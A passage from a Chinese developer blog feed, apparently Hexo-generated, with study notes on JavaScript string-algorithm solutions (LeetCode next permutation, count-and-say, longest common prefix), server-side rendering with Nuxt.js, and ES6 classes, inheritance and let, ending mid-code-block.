    
    <entry>
      <title>算法-字符串操作</title>
      <link href="2020/11/10/%E7%AE%97%E6%B3%95-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C/"/>
      <url>2020/11/10/%E7%AE%97%E6%B3%95-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<ul><li>下一个排列</li><li>对输入的字符串，去除其中的字符’b’以及连续出现的’a’和’c’</li><li>外观数列</li><li>最长公共前缀</li></ul><a id="more"></a><h2 id="下一个排列"><a href="#下一个排列" class="headerlink" title="下一个排列"></a>下一个排列</h2><ul><li><p>题目来源：<a href="https://leetcode-cn.com/problems/next-permutation/" target="_blank" rel="noopener">leetcode31</a></p></li><li><p>参考题解：<a href="https://leetcode-cn.com/problems/next-permutation/solution/si-lu-zui-qing-xi-de-ti-jie-by-heroding/" target="_blank" rel="noopener">思路最清晰的题解</a></p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">实现获取下一个排列的函数，算法需要将给定数字序列重新排列成字典序中下一个更大的排列。</span><br><span class="line"></span><br><span class="line">如果不存在下一个更大的排列，则将数字重新排列成最小的排列（即升序排列）。</span><br><span class="line"></span><br><span class="line">必须原地修改，只允许使用额外常数空间。</span><br><span class="line"></span><br><span class="line">以下是一些例子，输入位于左侧列，其相应输出位于右侧列。</span><br><span class="line">1,2,3 → 1,3,2</span><br><span class="line">3,2,1 → 1,2,3</span><br><span class="line">1,1,5 → 1,5,1</span><br></pre></td></tr></table></figure><ul><li>分析：就相当于找一个比当前数大并且最小的一个，比如比123大的有132,213,231,321,312，但是最小的是132</li><li>思路：<ul><li>从后向前遍历，找到nums[i] &lt; nums[i+1]的数，记录下i需要交换</li><li>交换的对象应该是比他大但是最小的一个，只需从后向前遍历找即可，因为i后面已经是降序</li><li>交换后打乱了序列，应该将 i 后面的序列重新排序</li><li>注意题目要求，只能在原数组上改，用 nums = nums.concat的一些操作会有问题，最好还是用splice,push,unshift这些修改原数组的方法</li></ul></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> nextPermutation = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> flag = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = nums.length; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums[i] &lt; nums[i+<span class="number">1</span>]) &#123;</span><br><span class="line">            flag = <span class="literal">false</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> j = nums.length; j &gt; i; j--) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[j] &gt; nums[i]) &#123;</span><br><span class="line">                    <span class="keyword">let</span> tmp = nums[j]</span><br><span class="line">                    nums[j] = nums [i]</span><br><span class="line">                    nums[i] = tmp</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">let</span> a = nums.splice(<span class="number">0</span>, i+<span class="number">1</span>)</span><br><span class="line">            nums.sort(<span class="function">(<span class="params">a,b</span>) =&gt;</span> a-b)</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> i = a.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">                nums.unshift(a[i])</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">        nums.reverse()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="对输入的字符串，去除其中的字符’b’以及连续出现的’a’和’c’"><a href="#对输入的字符串，去除其中的字符’b’以及连续出现的’a’和’c’" class="headerlink" title="对输入的字符串，去除其中的字符’b’以及连续出现的’a’和’c’"></a>对输入的字符串，去除其中的字符’b’以及连续出现的’a’和’c’</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&apos;aacbd&apos; =&gt; &apos;ad&apos;</span><br><span class="line">&apos;aabcd&apos; =&gt; &apos;ad&apos;</span><br><span class="line">&apos;aaabbccc&apos; =&gt; &apos;&apos;</span><br></pre></td></tr></table></figure><ul><li>正则解决</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params">str</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> res= str.replace(<span class="regexp">/b+/g</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">while</span>(res.match(<span class="regexp">/(ac)+/</span>))&#123;</span><br><span class="line">        res = res.replace(<span class="regexp">/ac/</span>,<span class="string">''</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="外观数列"><a href="#外观数列" class="headerlink" title="外观数列"></a>外观数列</h2><h3 id="正则表达式：-1捕获"><a href="#正则表达式：-1捕获" class="headerlink" title="正则表达式：\1捕获"></a>正则表达式：\1捕获</h3><blockquote><p>\1表示匹配第一个括号里的内容</p><p>利用这个\1，可以获取一个长字符串中的最长相同子串</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//寻找连续相同的最长子串</span></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">"ABCCCDDDDDEFFFFFFFFFFFFGGGGHHIIII"</span>;</span><br><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/(\w)\1+/g</span>;</span><br><span class="line"><span class="keyword">var</span> arr = str.match(reg);</span><br><span class="line"><span class="built_in">console</span>.log(arr) <span class="comment">// ["CCC", "DDDDD", "FFFFFFFFFFFF", "GGGG", "HH", "IIII"]</span></span><br></pre></td></tr></table></figure><h3 id="外观数列-1"><a href="#外观数列-1" class="headerlink" title="外观数列"></a>外观数列</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.     1</span><br><span class="line">2.     11</span><br><span class="line">3.     21</span><br><span class="line">4.     1211</span><br><span class="line">5.     111221</span><br><span class="line"></span><br><span class="line">给定一个正整数 n（1 ≤ n ≤ 30），输出外观数列的第 n 项。</span><br></pre></td></tr></table></figure><ul><li>利用正则表达式</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> countAndSay = <span class="function"><span class="keyword">function</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> pre = <span class="string">'1'</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        pre = pre.replace(<span class="regexp">/(\d)\1*/g</span>, item =&gt;<span class="string">`<span class="subst">$&#123;item.length&#125;</span><span class="subst">$&#123;item[<span class="number">0</span>]&#125;</span>`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pre</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  \1*代表出现任意次</span></span><br><span class="line"><span class="comment">// $&#123;&#125;代表字符串拼接</span></span><br><span class="line"><span class="comment">// replace第二个参数为函数例如</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str1 = <span class="string">'abbcbca'</span></span><br><span class="line">str1.replace(<span class="regexp">/(b)/g</span>,item =&gt; item+<span class="string">'*'</span>)  <span class="comment">//ab*b*cb*ca</span></span><br></pre></td></tr></table></figure><h2 id="算法：最长公共前缀"><a href="#算法：最长公共前缀" class="headerlink" title="算法：最长公共前缀"></a>算法：最长公共前缀</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">编写一个函数来查找字符串数组中的最长公共前缀。</span><br><span class="line"></span><br><span class="line">如果不存在公共前缀，返回空字符串 &quot;&quot;。</span><br><span class="line"></span><br><span class="line">示例 1:</span><br><span class="line"></span><br><span class="line">输入: [&quot;flower&quot;,&quot;flow&quot;,&quot;flight&quot;]</span><br><span class="line">输出: &quot;fl&quot;</span><br><span class="line"></span><br><span class="line">输入: [&quot;dog&quot;,&quot;racecar&quot;,&quot;car&quot;]</span><br><span class="line">输出: &quot;&quot;</span><br><span class="line">解释: 输入不存在公共前缀。</span><br></pre></td></tr></table></figure><ul><li>当字符串数组长度为 0 时则公共前缀为空，直接返回</li><li>令最长公共前缀 ans 的值为第一个字符串，进行初始化</li><li>遍历后面的字符串，依次将其与 ans 进行比较，两两找出公共前缀，最终结果即为最长公共前缀</li><li>如果查找过程中出现了 ans 为空的情况，则公共前缀不存在直接返回</li><li>时间复杂度：O(s)，s 为所有字符串的长度之和</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> longestCommonPrefix = <span class="function"><span class="keyword">function</span>(<span class="params">strs</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(strs.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line">    <span class="keyword">let</span> ans = strs[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">1</span>;i&lt;strs.length;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;ans.length;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(strs[i][j]!==ans[j])&#123;</span><br><span class="line">                ans = ans.slice(<span class="number">0</span>,j)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>服务端渲染与nuxtJs</title>
      <link href="2020/11/08/%E6%95%B4%E7%90%86-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%B8%B2%E6%9F%93%E4%B8%8Enuxt.js/"/>
      <url>2020/11/08/%E6%95%B4%E7%90%86-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%B8%B2%E6%9F%93%E4%B8%8Enuxt.js/</url>
      
        <content type="html"><![CDATA[<ul><li>服务端渲染基础<ul><li>传统服务端渲染</li><li>SPA 单页应用</li><li>同构应用</li><li>如何实现同构渲染</li></ul></li><li>Nuxt.js 基础</li><li>Nuxt.js 综合案例 </li></ul><a id="more"></a><h2 id="服务端渲染基础"><a href="#服务端渲染基础" class="headerlink" title="服务端渲染基础"></a>服务端渲染基础</h2><h3 id="传统服务端渲染"><a href="#传统服务端渲染" class="headerlink" title="传统服务端渲染"></a>传统服务端渲染</h3><ul><li><p>最早期，Web 页面渲染都是在服务端完成的，即服务端运行过程中将所需的数据结合页面模板渲染为</p><p>HTML，响应给客户端浏览器。所以浏览器呈现出来的是直接包含内容的页面。</p></li><li><p>这种方式的代表性技术有：ASP、PHP、JSP，再到后来的一些相对高级一点的服务端框架配合一些模板</p><p>引擎</p></li><li><p>在今天看来，这种渲染模式是不合理或者说不先进的。因为在当下这种网页越来越复杂的情况下，这种</p><p>模式存在很多明显的不足：</p><ul><li><p>应用的前后端部分完全耦合在一起，在前后端协同开发方面会有非常大的阻力；</p></li><li><p>前端没有足够的发挥空间，无法充分利用现在前端生态下的一些更优秀的方案；</p></li><li><p>由于内容都是在服务端动态生成的，所以服务端的压力较大；</p></li><li><p>相比目前流行的 SPA 应用来说，用户体验一般；</p></li></ul></li></ul><h3 id="SPA单页应用"><a href="#SPA单页应用" class="headerlink" title="SPA单页应用"></a>SPA单页应用</h3><ul><li>随着ajax的发展（AJAX 是与服务器交换数据并更新部分网页的艺术，在不重新加载整个页面的情况下）以及前端框架的发展，Vue，React，Angular 都是基于客户端渲染的前端框架，这类框架所构建的都是单页应用（SPA）</li><li>优点<ul><li>用户体验好</li><li>开发效率高</li><li>渲染性能好</li><li>可维护性好</li></ul></li><li>缺点<ul><li>首屏渲染时间长</li><li>不利于 SEO</li></ul></li></ul><h3 id="同构应用"><a href="#同构应用" class="headerlink" title="同构应用"></a>同构应用</h3><ul><li>同构服务端渲染首屏直出，解决 SPA 应用首屏渲染慢以及不利于 SEO 问题</li><li>然后通过客户端渲染接管页面内容交互得到更好的用户体验</li><li>实际是【服务端渲染】 + 【客户端渲染】的结合</li><li>优点：首屏渲染速度快、有利于 SEO</li><li>缺点：<ul><li>开发成本高。</li><li>涉及构建设置和部署的更多要求。与可以部署在任何静态文件服务器上的完全静态单页面应用程序 (SPA) 不同，服务器渲染应用程序，一般需要处于 Node.js server 运行环境。</li><li>更多的服务器端负载。在 Node.js 中渲染完整的应用程序，显然会比仅仅提供静态文件的server 更加大量占用 CPU 资源 (CPU-intensive - CPU 密集)，因此如果你预料在高流量环境(high traffic) 下使用，请准备相应的服务器负载，并明智地采用缓存策略</li></ul></li></ul><h3 id="如何实现同构渲染"><a href="#如何实现同构渲染" class="headerlink" title="如何实现同构渲染"></a>如何实现同构渲染</h3><ul><li>Vue、React等框架的官方解决方案</li><li>使用第三方解决方案<ul><li>React 生态的 Next.js</li><li>Vue 生态的 Nuxt.js</li></ul></li></ul><h2 id="Nuxt-js-基础"><a href="#Nuxt-js-基础" class="headerlink" title="Nuxt.js 基础"></a>Nuxt.js 基础</h2><p>Nuxt.js 是一个基于 Vue.js 的服务端渲染应用框架，它可以帮我们轻松的实现同构应用。</p><p>通过对客户端/服务端基础架构的抽象组织，Nuxt.js 主要关注的是应用的 <strong>UI渲染</strong>。</p><ul><li><a href="https://zh.nuxtjs.org/" target="_blank" rel="noopener">官网</a></li><li><a href="https://github.com/nuxt/nuxt.js" target="_blank" rel="noopener">Github仓库</a></li></ul><h3 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 创建项目目录 </span><br><span class="line">mkdir realworld-nuxtjs </span><br><span class="line"></span><br><span class="line"># 进入项目目录 </span><br><span class="line">cd realworld-nuxtjs </span><br><span class="line"></span><br><span class="line"># 生成 package.json 文件 </span><br><span class="line">npm init -y </span><br><span class="line"></span><br><span class="line"># 安装 nuxt 依赖 </span><br><span class="line">npm install nuxt</span><br></pre></td></tr></table></figure><p>在 <code>package.json</code> 中添加启动脚本：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">"scripts": &#123; </span><br><span class="line">    "dev": "nuxt" </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>npm run dev</code> 启动服务</p><h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><p><em>Nuxt.js 依据</em> <code>pages</code> <em>目录结构自动生成</em> <a href="https://github.com/vuejs/vue-router" target="_blank" rel="noopener">vue-router</a> <em>模块的路由配置。</em></p><p>假设 <code>pages</code> 的目录结构如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pages/</span><br><span class="line">--| user/</span><br><span class="line">-----| index.vue</span><br><span class="line">-----| one.vue</span><br><span class="line">--| index.vue</span><br></pre></td></tr></table></figure><p>那么，Nuxt.js 自动生成的路由配置如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">router: &#123;</span><br><span class="line">  routes: [</span><br><span class="line">    &#123;</span><br><span class="line">      name: <span class="string">'index'</span>,</span><br><span class="line">      path: <span class="string">'/'</span>,</span><br><span class="line">      component: <span class="string">'pages/index.vue'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      name: <span class="string">'user'</span>,</span><br><span class="line">      path: <span class="string">'/user'</span>,</span><br><span class="line">      component: <span class="string">'pages/user/index.vue'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      name: <span class="string">'user-one'</span>,</span><br><span class="line">      path: <span class="string">'/user/one'</span>,</span><br><span class="line">      component: <span class="string">'pages/user/one.vue'</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Nuxt-js-综合案例"><a href="#Nuxt-js-综合案例" class="headerlink" title="Nuxt.js 综合案例"></a>Nuxt.js 综合案例</h2><ul><li><a href="https://github.com/gothinkster/realworld" target="_blank" rel="noopener">GitHub仓库</a></li><li><a href="https://demo.realworld.io/#/" target="_blank" rel="noopener">在线示例</a></li><li><a href="https://github.com/gothinkster/realworld/tree/master/api" target="_blank" rel="noopener">接口文档</a></li><li><p><a href="https://github.com/gothinkster/realworld-starter-kit/blob/master/FRONTEND_INSTRUCTIONS.md" target="_blank" rel="noopener">页面模板</a></p></li><li><p><a href="https://github.com/jinjingxuan/realworld-nuxtJs" target="_blank" rel="noopener">项目地址</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> SSR </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ES6扩展</title>
      <link href="2020/11/06/%E6%95%B4%E7%90%86-ES6%E6%89%A9%E5%B1%95/"/>
      <url>2020/11/06/%E6%95%B4%E7%90%86-ES6%E6%89%A9%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<ul><li>ES6的class</li><li>ES6的继承，extend与super</li><li>ES6的let与const</li><li>对象字面量的增强</li><li>object.assign</li><li>Set数据结构</li><li>Symbol可作为键</li><li>forEach、find、map、filter、reduce、every、some</li></ul><a id="more"></a><h2 id="ES6的class"><a href="#ES6的class" class="headerlink" title="ES6的class"></a>ES6的class</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;<span class="comment">//定义了一个名字为Person的类</span></span><br><span class="line">    <span class="keyword">constructor</span>(name,age)&#123;<span class="comment">//constructor是一个构造方法，用来接收参数</span></span><br><span class="line">        <span class="keyword">this</span>.name = name;<span class="comment">//this代表的是实例对象</span></span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    say()&#123;<span class="comment">//这是一个类的方法，注意千万不要加上function</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我的名字叫"</span> + <span class="keyword">this</span>.name+<span class="string">"今年"</span>+<span class="keyword">this</span>.age+<span class="string">"岁了"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> obj=<span class="keyword">new</span> Person(<span class="string">"laotie"</span>,<span class="number">88</span>);</span><br><span class="line"><span class="built_in">console</span>.log(obj.say());<span class="comment">//我的名字叫laotie今年88岁了</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> Person);<span class="comment">//function</span></span><br><span class="line"><span class="built_in">console</span>.log(Person===Person.prototype.constructor);<span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//实际上类的所有方法都定义在类的prototype属性上。</span></span><br><span class="line"><span class="comment">//还可以通过Object.assign方法来为对象动态增加方法</span></span><br><span class="line"><span class="built_in">Object</span>.assign(Person.prototype,&#123;</span><br><span class="line">    getName:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;,</span><br><span class="line">    getAge:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">var</span> obj=<span class="keyword">new</span> Person(<span class="string">"laotie"</span>,<span class="number">88</span>);</span><br><span class="line"><span class="built_in">console</span>.log(obj.getName());<span class="comment">//laotie</span></span><br><span class="line"><span class="built_in">console</span>.log(obj.getAge());<span class="comment">//88</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//constructor方法是类的构造函数的默认方法，通过new命令生成对象实例时，自动调用该方法。</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Box</span></span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>()&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"啦啦啦，今天天气好晴朗"</span>);<span class="comment">//当实例化对象时该行代码会执行。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> obj=<span class="keyword">new</span> Box();</span><br><span class="line"></span><br><span class="line"><span class="comment">//类的所有实例共享一个原型对象，它们的原型都是Person.prototype，所以proto属性是相等的</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Box</span></span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(num1,num2)&#123;</span><br><span class="line">        <span class="keyword">this</span>.num1 = num1;</span><br><span class="line">        <span class="keyword">this</span>.num2 = num2;</span><br><span class="line">    &#125;</span><br><span class="line">    sum()&#123;</span><br><span class="line">        <span class="keyword">return</span> num1+num2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//box1与box2都是Box的实例。它们的__proto__都指向Box的prototype</span></span><br><span class="line"><span class="keyword">var</span> box1=<span class="keyword">new</span> Box(<span class="number">12</span>,<span class="number">88</span>);</span><br><span class="line"><span class="keyword">var</span> box2=<span class="keyword">new</span> Box(<span class="number">40</span>,<span class="number">60</span>);</span><br><span class="line"><span class="built_in">console</span>.log(box1.__proto__===box2.__proto__);<span class="comment">//true</span></span><br><span class="line"><span class="comment">//由此，也可以通过proto来为类增加方法。使用实例的proto属性改写原型，会改变Class的原始定义，影响到所有实例，所以不推荐使用！</span></span><br></pre></td></tr></table></figure><h2 id="ES6的继承"><a href="#ES6的继承" class="headerlink" title="ES6的继承"></a>ES6的继承</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span> <span class="keyword">extends</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(x, y, z) &#123;</span><br><span class="line">        <span class="keyword">super</span>(x, y);<span class="comment">//要在this的前面</span></span><br><span class="line">        <span class="keyword">this</span>.z = z;</span><br><span class="line">    &#125;</span><br><span class="line">    toString2()&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.toString()+<span class="string">' '</span>+<span class="keyword">this</span>.z</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//super表示父类的构造函数，并且子类的构造函数必须执行一次super</span></span><br><span class="line"><span class="comment">//`super()`相当于`a.prototype.constructor.call(this)`</span></span><br></pre></td></tr></table></figure><h3 id="继承的时候extends干了什么"><a href="#继承的时候extends干了什么" class="headerlink" title="继承的时候extends干了什么"></a>继承的时候extends干了什么</h3><p><strong>extends在实现继承方面，本质上也是原型链继承,该方法实现了两步原型链继承</strong><br>大多数浏览器的 ES5 实现之中，每一个对象都有<strong>proto</strong>属性，指向对应的构造函数的prototype属性。<br>Class 作为构造函数的语法糖，同时有prototype属性和<strong>proto</strong>属性，因此同时存在两条继承链。</p><ul><li>（1）子类的<strong>proto</strong>属性，表示构造函数的继承，总是指向父类。（把子类构造函数(<code>Child</code>)的原型(<code>__proto__</code>)指向了父类构造函数(<code>Parent</code>)，）</li><li>（2）子类prototype属性的<strong>proto</strong>属性，表示方法的继承，总是指向父类的prototype属性。</li><li><a href="https://images2018.cnblogs.com/blog/1290444/201805/1290444-20180522190257058-425523963.png" target="_blank" rel="noopener">ES5继承</a></li><li><a href="https://images2018.cnblogs.com/blog/1290444/201805/1290444-20180522190423509-1503553581.png" target="_blank" rel="noopener">ES6继承</a></li></ul><p>ES5只有两种声明变量的方式：var和function，ES6还添加了两种常用的声明变量的方式：let和const。</p><h2 id="ES6的let命令："><a href="#ES6的let命令：" class="headerlink" title="ES6的let命令："></a>ES6的let命令：</h2><p>ES6新增了let命令，用来声明变量，它的用法类似于var，但是所声明的变量，只在let命令所在的代码块内有效。</p><p>1、for循环的计数器，就很合适使用let。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">a[i] = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">a[<span class="number">6</span>](); <span class="comment">// 10</span></span><br></pre></td></tr></table></figure><p>变量i是var声明的，在全局范围内有效，所以每次循环新的i值都会覆盖旧值，导致最后输出的是最后一轮的i的值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 